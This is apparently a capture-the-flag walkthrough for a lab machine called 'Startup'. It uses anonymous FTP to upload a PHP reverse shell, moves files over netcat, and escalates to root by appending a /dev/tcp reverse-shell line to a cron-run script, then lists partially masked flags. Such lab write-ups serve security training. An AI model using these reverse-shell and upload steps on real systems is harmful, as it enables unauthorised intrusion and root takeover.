# Startup

- What is the secret spicy soup recipe?

	- `nmap -sV 10.10.96.10`
	- `ftp <TARGET_IP>` in anonymous mode
	- `mget *`
	- `gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	- The same files I get with ftp there are on http://<TARGET_IP>/files
	- Put a reverse shell in the ftp server.
	- `wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`
	- Change the default IP with your IP address.
	- `cd ftp` and `put php-reverse-shell.php` inside ftp.
	- `nc -lvnp 1234` on your machine
	- Execute it clicking on the link in http://<TARGET_IP>/files
	- `cat recipe.txt`
	- `love`	

- What are the contents of user.txt?

	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
	- On your machine `wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`
	- Serve that file. `nc -lnvp 4444 < linpeas.sh`
	- on target `nc -w 3 <YOUR_IP> 4444 > linpeas.sh`
	- There are some important files I didn't notice.
	- `/incidents/suspicious.pcapng`
	- Serve this fie via nc as before.
	- Grab that file with your machine.
	- `wireshark suspicious.pcapng`
	- At a certain point, looking into packets, you will see a packet saying `password for www-data:`. The next packet will have the password in clear text.
	- `THM{03c**d61******bfb3**********0e79}`

- What are the contents of root.txt?

	- Analyzing lennie's files I see there is a script floder, but I don't have permission to write in planner.sh.
	- Trying with /etc/print.sh worked.
	- On your machine `nc -lnvp 4444`.
	- `echo "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" >> /etc/print.sh` and wait about 1-2 minutes.
	- `cat /root/root.txt`
	- `THM{f963**a6a******22**********76d}`

- Congratulations!

	no answer needed







